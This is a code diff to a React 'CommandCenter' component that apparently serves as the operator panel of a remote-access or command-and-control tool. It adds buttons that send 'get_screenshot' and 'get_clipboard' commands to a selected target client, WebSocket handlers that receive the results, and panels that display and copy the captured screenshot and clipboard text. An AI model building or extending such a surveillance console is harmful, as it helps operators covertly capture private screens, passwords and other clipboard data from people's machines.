@@ -83,6 +83,20 @@ export function CommandCenter({ onExit, onViewData }: CommandCenterProps) {
               systemInfo: message.data
             }));
           }
+        } else if (message.type === 'screenshot_data' && message.sessionId) {
+          if (selectedClient === message.sessionId) {
+            setTargetData(prev => ({
+              ...prev,
+              screenshot: message.data
+            }));
+          }
+        } else if (message.type === 'clipboard_data' && message.sessionId) {
+          if (selectedClient === message.sessionId) {
+            setTargetData(prev => ({
+              ...prev,
+              clipboard: message.data
+            }));
+          }
         }
       } catch (error) {
         console.error('Error handling WebSocket message:', error);
@@ -299,6 +313,26 @@ export function CommandCenter({ onExit, onViewData }: CommandCenterProps) {
                   variant="outline" 
                   className="w-full text-left justify-start"
                   disabled={!selectedClient}
+                  onClick={() => selectedClient && sendCommandToClient(selectedClient, 'get_screenshot')}
+                >
+                  <Camera className="w-4 h-4 mr-2" />
+                  Request Screenshot
+                </Button>
+                <Button 
+                  size="sm" 
+                  variant="outline" 
+                  className="w-full text-left justify-start"
+                  disabled={!selectedClient}
+                  onClick={() => selectedClient && sendCommandToClient(selectedClient, 'get_clipboard')}
+                >
+                  <Copy className="w-4 h-4 mr-2" />
+                  Request Clipboard
+                </Button>
+                <Button 
+                  size="sm" 
+                  variant="outline" 
+                  className="w-full text-left justify-start"
+                  disabled={!selectedClient}
                   onClick={() => selectedClient && sendCommandToClient(selectedClient, 'get_system_info')}
                 >
                   <Monitor className="w-4 h-4 mr-2" />
@@ -488,6 +522,72 @@ export function CommandCenter({ onExit, onViewData }: CommandCenterProps) {
                       ))}
                     </div>
                   </div>
+
+                  {/* Screenshot Data */}
+                  {targetData.screenshot && (
+                    <div className="bg-slate-900 rounded-lg p-4">
+                      <h4 className="text-red-400 font-medium mb-2 flex items-center">
+                        <Camera className="w-4 h-4 mr-2" />
+                        Screenshot
+                      </h4>
+                      <div className="flex flex-col items-start space-y-2">
+                        <Badge className="bg-green-500 bg-opacity-20 text-green-400">Screenshot Received</Badge>
+                        <div className="bg-black rounded aspect-video flex items-center justify-center min-h-[180px]">
+                          <img 
+                            src={`data:${targetData.screenshot.type};base64,${targetData.screenshot.data}`} 
+                            alt="Screenshot" 
+                            className="w-full h-full object-contain rounded"
+                          />
+                        </div>
+                        <Button 
+                          onClick={() => {
+                            navigator.clipboard.writeText(`data:${targetData.screenshot.type};base64,${targetData.screenshot.data}`);
+                            toast({
+                              title: "Screenshot Copied",
+                              description: "Screenshot data copied to clipboard",
+                            });
+                          }}
+                          size="sm"
+                          variant="outline"
+                          className="w-full"
+                        >
+                          <Copy className="w-4 h-4 mr-2" />
+                          Copy Screenshot Data
+                        </Button>
+                      </div>
+                    </div>
+                  )}
+
+                  {/* Clipboard Data */}
+                  {targetData.clipboard && (
+                    <div className="bg-slate-900 rounded-lg p-4">
+                      <h4 className="text-red-400 font-medium mb-2 flex items-center">
+                        <Copy className="w-4 h-4 mr-2" />
+                        Clipboard Data
+                      </h4>
+                      <div className="flex flex-col items-start space-y-2">
+                        <Badge className="bg-blue-500 bg-opacity-20 text-blue-400">Clipboard Data Received</Badge>
+                        <div className="bg-slate-700 rounded-md p-3 text-slate-200 text-sm break-all">
+                          {targetData.clipboard}
+                        </div>
+                        <Button 
+                          onClick={() => {
+                            navigator.clipboard.writeText(targetData.clipboard);
+                            toast({
+                              title: "Clipboard Copied",
+                              description: "Clipboard data copied to clipboard",
+                            });
+                          }}
+                          size="sm"
+                          variant="outline"
+                          className="w-full"
+                        >
+                          <Copy className="w-4 h-4 mr-2" />
+                          Copy Clipboard Data
+                        </Button>
+                      </div>
+                    </div>
+                  )}
                 </div>
               )}
             </CardContent>
